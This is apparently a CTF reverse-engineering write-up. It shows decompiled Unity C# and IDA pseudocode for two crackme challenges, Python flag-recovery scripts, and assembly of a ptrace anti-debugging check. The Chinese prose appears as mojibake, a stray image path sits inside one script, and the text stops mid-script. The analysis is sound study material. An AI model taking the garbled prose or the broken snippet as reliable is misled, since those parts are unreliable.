<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.UI;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GameManager</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Token: 0x06000002 RID: 2 RVA: 0x000020A9 File Offset: 0x000004A9</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">RemoveDash</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        str = str.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000003 RID: 3 RVA: 0x000020C0 File Offset: 0x000004C0</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">what</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MD5 md = MD5.Create();</span><br><span class="line">        <span class="built_in">byte</span>[] bytes = Encoding.Default.GetBytes(str);</span><br><span class="line">        <span class="built_in">byte</span>[] <span class="keyword">value</span> = md.ComputeHash(bytes);</span><br><span class="line">        <span class="keyword">return</span> GameManager.RemoveDash(BitConverter.ToString(<span class="keyword">value</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000004 RID: 4 RVA: 0x000020F4 File Offset: 0x000004F4</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.startPoint = GameObject.Find(<span class="string">&quot;StartPoint&quot;</span>).transform;</span><br><span class="line">        <span class="keyword">this</span>.spawnPoint = GameObject.Find(<span class="string">&quot;SpawnPoint&quot;</span>).transform;</span><br><span class="line">        <span class="keyword">this</span>.mainCamera = Camera.main;</span><br><span class="line">        <span class="keyword">this</span>.SpawnPin();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000005 RID: 5 RVA: 0x00002134 File Offset: 0x00000534</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">30</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> text = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.magicc.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">char</span> c = (<span class="built_in">char</span>)<span class="keyword">this</span>.magicc[i];</span><br><span class="line">                text += c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = text;</span><br><span class="line">            <span class="keyword">this</span>.nothing += GameManager.what(<span class="keyword">this</span>.flagText.text);</span><br><span class="line">            <span class="keyword">this</span>.nothing += <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> text2 = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.magic.Length; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">char</span> c2 = (<span class="built_in">char</span>)<span class="keyword">this</span>.magic[j];</span><br><span class="line">                text2 += c2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = text2;</span><br><span class="line">            text2 += <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">100</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.scoreText.text = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = <span class="keyword">this</span>.nothing;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isGameOver)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetMouseButtonDown(<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.score++;</span><br><span class="line">            <span class="keyword">this</span>.scoreText.text = <span class="keyword">this</span>.score.ToString();</span><br><span class="line">            <span class="keyword">this</span>.currentPin.StartFly();</span><br><span class="line">            <span class="keyword">this</span>.SpawnPin();</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; <span class="keyword">this</span>.magicc.Length; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>.magicc[k] ^= <span class="keyword">this</span>.score;</span><br><span class="line">                <span class="keyword">this</span>.magic[k] ^= <span class="keyword">this</span>.score;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000006 RID: 6 RVA: 0x000022F6 File Offset: 0x000006F6</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SpawnPin</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.currentPin = UnityEngine.Object.Instantiate&lt;GameObject&gt;(<span class="keyword">this</span>.pinPrefab, <span class="keyword">this</span>.spawnPoint.position, <span class="keyword">this</span>.pinPrefab.transform.rotation).GetComponent&lt;Pin&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000007 RID: 7 RVA: 0x00002329 File Offset: 0x00000729</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GameOver</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isGameOver)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        GameObject.Find(<span class="string">&quot;Circle&quot;</span>).GetComponent&lt;RotateSelf&gt;().enabled = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">base</span>.StartCoroutine(<span class="keyword">this</span>.GameOverAnimation());</span><br><span class="line">        <span class="keyword">this</span>.isGameOver = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000008 RID: 8 RVA: 0x00002360 File Offset: 0x00000760</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> IEnumerator <span class="title">GameOverAnimation</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.mainCamera.backgroundColor = Color.Lerp(<span class="keyword">this</span>.mainCamera.backgroundColor, Color.red, <span class="keyword">this</span>.speed * Time.deltaTime);</span><br><span class="line">            <span class="keyword">this</span>.mainCamera.orthographicSize = Mathf.Lerp(<span class="keyword">this</span>.mainCamera.orthographicSize, <span class="number">4f</span>, <span class="keyword">this</span>.speed * Time.deltaTime);</span><br><span class="line">            <span class="keyword">if</span> (Mathf.Abs(<span class="keyword">this</span>.mainCamera.orthographicSize - <span class="number">4f</span>) &lt; <span class="number">0.01f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">0.2f</span></span>)</span>;</span><br><span class="line">        SceneManager.LoadScene(SceneManager.GetActiveScene().buildIndex);</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000001 RID: 1</span></span><br><span class="line">    <span class="keyword">private</span> Transform startPoint;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000002 RID: 2</span></span><br><span class="line">    <span class="keyword">private</span> Transform spawnPoint;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000003 RID: 3</span></span><br><span class="line">    <span class="keyword">private</span> Pin currentPin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000004 RID: 4</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> isGameOver;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000005 RID: 5</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000006 RID: 6</span></span><br><span class="line">    <span class="keyword">private</span> Camera mainCamera;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000007 RID: 7</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> nothing = <span class="built_in">string</span>.Empty;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000008 RID: 8</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span>[] magicc = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">75</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">102</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">108</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">43</span>,</span><br><span class="line">        <span class="number">47</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">118</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        <span class="number">108</span>,</span><br><span class="line">        <span class="number">62</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000009 RID: 9</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span>[] magic = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">90</span>,</span><br><span class="line">        <span class="number">81</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">92</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">90</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">73</span>,</span><br><span class="line">        <span class="number">75</span>,</span><br><span class="line">        <span class="number">64</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">88</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">92</span>,</span><br><span class="line">        <span class="number">91</span>,</span><br><span class="line">        <span class="number">9</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000A RID: 10</span></span><br><span class="line">    <span class="keyword">public</span> Text scoreText;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000B RID: 11</span></span><br><span class="line">    <span class="keyword">public</span> Text flagText;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000C RID: 12</span></span><br><span class="line">    <span class="keyword">public</span> GameObject pinPrefab;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000D RID: 13</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> speed = <span class="number">3f</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ¸¸æˆå‰30æ¬¡æ¯åˆ·æ–°ä¸€æ¬¡åˆ†æ•°å°±ä¼šä¸æ˜æ–‡è¿›è¡Œå¼‚æˆ– æœ€åè¿›è¡Œmd5åŠ å¯†ç„¶ååœ¨åˆ†æ•°è¾¾åˆ°100æ—¶æ˜¾ç¤º æ˜¾ç„¶ä¸å¯èƒ½ç‚¹åˆ°100 <del>ä½†æ˜¯å¯ä»¥å…ˆç‚¹åˆ°30 å†ç”¨CEæ”¹åˆ°100</del> å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">key = [ 75, 109, 102, 63, 107, 112, 63, 108, 124, 112, 109, 122, 63, 43, 47, 63, 111, 112, 118, 113, 107, 108, 62]</span><br><span class="line">convt = hashlib.md5()</span><br><span class="line">for i in range(1, 31):</span><br><span class="line">    for j in range(len(key)):</span><br><span class="line">        key[j] ^= i</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for each in key:</span><br><span class="line">    flag += chr(each)</span><br><span class="line">convt.update(flag.encode())</span><br><span class="line">print(convt.hexdigest().upper())</span><br><span class="line"># CBDDD133B60130856D3C695D9E5ED6A5</span><br></pre></td></tr></table></figure>

<h3 id="babycode-ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†"><a href="#babycode-ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†" class="headerlink" title="babycode | ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†"></a>babycode | ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†</h3><p>IDA64æ‰“å¼€ ä¼ªä»£ç å¦‚ä¸‹ å…¶ä¸­ä¸¤ä¸ªç®€å•åŠ å¯†ç®—æ³•ä¸å±•ç¤º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-134h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="type">char</span> enc[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">33</span>]; <span class="comment">// [rsp+24h] [rbp-11Ch]</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">113</span>]; <span class="comment">// [rsp+B7h] [rbp-89h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;input[<span class="number">9</span>]);</span><br><span class="line">  *enc = <span class="number">120</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">91</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">86</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">122</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">93</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">84</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">37</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">49</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">32</span>;</span><br><span class="line">  v10[<span class="number">8</span>] = <span class="number">104</span>;</span><br><span class="line">  v10[<span class="number">9</span>] = <span class="number">61</span>;</span><br><span class="line">  v10[<span class="number">10</span>] = <span class="number">100</span>;</span><br><span class="line">  v10[<span class="number">11</span>] = <span class="number">-110</span>;</span><br><span class="line">  v10[<span class="number">12</span>] = <span class="number">118</span>;</span><br><span class="line">  v10[<span class="number">13</span>] = <span class="number">99</span>;</span><br><span class="line">  v10[<span class="number">14</span>] = <span class="number">123</span>;</span><br><span class="line">  v10[<span class="number">15</span>] = <span class="number">89</span>;</span><br><span class="line">  v10[<span class="number">16</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">17</span>] = <span class="number">33</span>;</span><br><span class="line">  v10[<span class="number">18</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">19</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">20</span>] = <span class="number">118</span>;</span><br><span class="line">  v10[<span class="number">21</span>] = <span class="number">-121</span>;</span><br><span class="line">  v10[<span class="number">22</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">23</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">24</span>] = <span class="number">-123</span>;</span><br><span class="line">  v10[<span class="number">25</span>] = <span class="number">112</span>;</span><br><span class="line">  v10[<span class="number">26</span>] = <span class="number">-98</span>;</span><br><span class="line">  v10[<span class="number">27</span>] = <span class="number">79</span>;</span><br><span class="line">  v10[<span class="number">28</span>] = <span class="number">112</span>;</span><br><span class="line">  v10[<span class="number">29</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">30</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">31</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">32</span>] = <span class="number">-120</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(input, <span class="string">&quot;fuwafuwa&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;input[<span class="number">9</span>]); ++i )</span><br><span class="line">    input[i + <span class="number">9</span>] = (<span class="number">16</span> * input[i + <span class="number">9</span>]) | (input[i + <span class="number">9</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;<span class="comment">// äº’æ¢è¾“å…¥ä¸­çš„é«˜/ä½å››ä½</span></span><br><span class="line">  encode(&amp;input[<span class="number">9</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(&amp;input[<span class="number">9</span>]); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    input[j + <span class="number">9</span>] += j;</span><br><span class="line">    input[j + <span class="number">9</span>] ^= input[j % <span class="number">8</span>] % <span class="number">32</span> + <span class="number">1</span>;</span><br><span class="line">    ceasar(input, j);                           <span class="comment">// å‘åç§»jä½çš„å‡¯æ’’åŠ å¯†</span></span><br><span class="line">    v3 = <span class="built_in">strlen</span>(input);</span><br><span class="line">    reverse(input, v3);                         <span class="comment">// å¯¹ç§°å¯¹æ¢key(0-&gt;8, 1-&gt;7...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="built_in">strlen</span>(enc); ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[k + <span class="number">9</span>] != *&amp;enc[<span class="number">4</span> * k] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your input is flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+17h] [rbp-49h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> *ptr_input; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> *key2; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *ptr_input_; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="type">size_t</span> len_of_input; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 max_key; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 last; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  len_of_input = <span class="built_in">strlen</span>(input);</span><br><span class="line">  max_key = <span class="number">3</span> * ((len_of_input &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="built_in">malloc</span>(max_key + len_of_input);</span><br><span class="line">  key2 = &amp;v11[max_key];                         <span class="comment">// è¾“å…¥çš„é¦–åœ°å€</span></span><br><span class="line">  last = &amp;v11[max_key - <span class="number">1</span> + len_of_input];      <span class="comment">// v11çš„æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">  ptr_input = &amp;v11[max_key];</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v11[max_key], input, len_of_input);   <span class="comment">// æœ€åçš„ä¸€æ®µå…ƒç´ å’Œè¾“å…¥ç›¸åŒ</span></span><br><span class="line">  <span class="keyword">while</span> ( ptr_input &lt;= last )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr_input )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( ptr_input_ = ptr_input; ptr_input_ &lt;= last; ++ptr_input_ )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v2 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        v2 = *ptr_input_ &amp; <span class="number">0x3F</span>;</span><br><span class="line">        *ptr_input_ = (*ptr_input_ + v4) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *--key2 = off_55B72E249018[v2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++ptr_input;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    key += rand() % <span class="number">100</span>;</span><br><span class="line">  key = key % <span class="number">0x20</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; &amp;v11[max_key] - key2; ++j )</span><br><span class="line">    input[j] = key ^ key2[j];</span><br><span class="line">  input[j] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒåŠ å¯†æ˜¯ä¸€ä¸ªbase64çš„æ¢è¡¨ è¦æ³¨æ„çš„æ˜¯å…¶ä¸­çš„keyåŠ¨æ€è°ƒè¯•å‡ºæ¥å¹¶ä¸æ­£ç¡® å› ä¸ºç¨‹åºä¼šæ£€æµ‹åŠ¨æ€è°ƒè¯•æ”¹å˜keyçš„åˆå€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init_array:000055B72E248D80                               _init_array segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:000055B72E248D80                               assume cs:_init_array</span><br><span class="line">.init_array:000055B72E248D80                               ;org 55B72E248D80h</span><br><span class="line">.init_array:000055B72E248D80 00 62 24 2E B7 55 00 00       dq offset sub_55B72E246200</span><br><span class="line">.init_array:000055B72E248D88 09 62 24 2E B7 55 00 00       dq offset sub_55B72E246209</span><br><span class="line">.init_array:000055B72E248D88                               _init_array ends</span><br><span class="line">...</span><br><span class="line">.text:000055B72E246209                               sub_55B72E246209 proc near              ; DATA XREF: .init_array:000055B72E248D88â†“o</span><br><span class="line">.text:000055B72E246209</span><br><span class="line">.text:000055B72E246209                               var_4= dword ptr -4</span><br><span class="line">.text:000055B72E246209</span><br><span class="line">.text:000055B72E246209                               ; __unwind &#123;</span><br><span class="line">.text:000055B72E246209 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000055B72E24620D 55                            push    rbp</span><br><span class="line">.text:000055B72E24620E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000055B72E246211 C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:000055B72E246218 BB 00 00 00 00                mov     ebx, 0                          ; ptrace_request</span><br><span class="line">.text:000055B72E24621D B9 00 00 00 00                mov     ecx, 0                          ; pid</span><br><span class="line">.text:000055B72E246222 BA 00 00 00 00                mov     edx, 0                          ; addr</span><br><span class="line">.text:000055B72E246227 B8 1A 00 00 00                mov     eax, 1Ah</span><br><span class="line">.text:000055B72E24622C CD 80                         int     80h                             ; LINUX - sys_ptrace</span><br><span class="line">.text:000055B72E24622C</span><br><span class="line">.text:000055B72E24622E 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:000055B72E246231 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:000055B72E246234 48 98                         cdqe</span><br><span class="line">.text:000055B72E246236 48 83 F8 FF                   cmp     rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:000055B72E24623A 75 0A                         jnz     short loc_55B72E246246</span><br><span class="line">.text:000055B72E24623A</span><br><span class="line">.text:000055B72E24623C C7 05 CA 2D 00 00 08 00 00 00 mov     cs:key, 8</span><br><span class="line">.text:000055B72E24623C</span><br><span class="line">.text:000055B72E246246</span><br><span class="line">.text:000055B72E246246                               loc_55B72E246246:                       ; CODE XREF: sub_55B72E246209+31â†‘j</span><br><span class="line">.text:000055B72E246246 90                            nop</span><br><span class="line">.text:000055B72E246247 5D                            pop     rbp</span><br><span class="line">.text:000055B72E246248 C3                            retn</span><br><span class="line">.text:000055B72E246248                               ; &#125; // starts at 55B72E246209</span><br><span class="line">.text:000055B72E246248</span><br><span class="line">.text:000055B72E246248                               sub_55B72E246209 endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç”¨keyåœ¨<code>(1, 31)</code>ä¸”åŠ å¯†åå¯†æ–‡éƒ½åœ¨è¡¨ä¸­çˆ†ç ´å‡ºkeyä¸º21 æ®æ­¤å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">![image-<span class="number">20231128164528686</span>](C:\Users\Orink\AppData\Roaming\Typora\typora-user-images\image-<span class="number">20231128164528686.</span>png)<span class="keyword">def</span> <span class="title function_">emulator</span>(<span class="params">key:<span class="built_in">list</span>, time:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        key[i] = <span class="number">97</span> + (key[i] - <span class="number">97</span> + time) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">antiemulator</span>(<span class="params">key:<span class="built_in">list</span>, time:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        key[i] 